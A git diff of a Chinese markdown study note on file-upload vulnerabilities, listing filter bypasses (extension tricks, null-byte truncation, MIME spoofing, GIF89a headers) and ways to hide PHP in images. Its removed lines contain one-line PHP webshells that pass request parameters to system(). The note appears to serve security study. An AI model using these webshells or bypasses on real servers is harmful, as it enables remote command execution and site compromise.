@@ -1,8 +1,9 @@
 # 文件上传
 
-文件上传通常有两个目的，第一是直接上传PHP等可执行文件，进而获取webshell。第二是通过上传包含有PHP代码的文件，再结合文件包含来获取webshell。
+文件上传漏洞有两个利用途径：一是直接上传可执行文件（如 PHP）以获取 webshell；二是上传包含 PHP 代码的文件，通过文件包含获取 webshell。
 
-## 常用方法
+## 常见绕过方法
+
 ### 客户端校验绕过
 
 ### 文件扩展名检测绕过
@@ -18,12 +19,12 @@
   - /1.jpg/1.php
 
 
-### 文件截断绕过（CVE-2006-7243）
+### 文件截断绕过
 
+CVE-2006-7243
 
-```
-**PHP before 5.3.4 **accepts the \0 character in a pathname, which might allow context-dependent attackers to bypass intended access restrictions by placing a safe file extension after this character, as demonstrated by .php\0.jpg at the end of the argument to the file_exists function.
-```
+> **PHP before 5.3.4** accepts the \0 character in a pathname, which might allow context-dependent attackers to bypass intended access restrictions by placing a safe file extension after this character, as demonstrated by .php\0.jpg at the end of the argument to the file_exists function.
+
 
 ### `Content-Type`检测绕过（MIME绕过）
 
@@ -40,28 +41,44 @@
 
 - 文件头检测
   - `GIF89a`
-- [PHP语言标记](/Web/PHP?id=标记)检测，在PHP 7以前版本，通常使用脚本标记`<script language="php"></script>`绕过
+- [PHP语言标记](/Web/PHP?id=标记)检测，在`PHP 7`以前版本，通常使用脚本标记`<script language="php"></script>`绕过
 
 ## 制作图片马
 
-图片马指的是正常图片中包含有代码，常用制作方法如下：
+图片马是指在正常图片中嵌入可执行代码，表面上看起来仍是正常图片。常用制作方法如下：
+
+- 拼接图片和代码
 
 ```powershell
+<#
+copy 是 Windows 命令行中的复制命令
+/b 表示以二进制模式复制文件
+1.jpg+1.php 表示将 1.jpg 和 1.php 文件的内容合并
+2.jpg 是合并后生成的新文件名
+#>
 copy /b 1.jpg+1.php 2.jpg
 ```
 
-```shell
-exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+- 修改图片的元数据
 
-echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
+将指定的 PHP 代码作为注释添加到 img.png 图片。
+
+```shell
+exiftool -Comment="<?php ... ?>" >> img.png
 ```
+
 ## 条件竞争
 
 先保存文件，再检测文件内容。利用时间差，访问文件。
 
+?> __TODO__ 例题
+
 ## 从文件上传到其他漏洞
+
 ## Zip/Tar文件上传后自动解压缩
+
 ## php-gd渲染绕过
+
 ## 练习题
 
 - upload labs
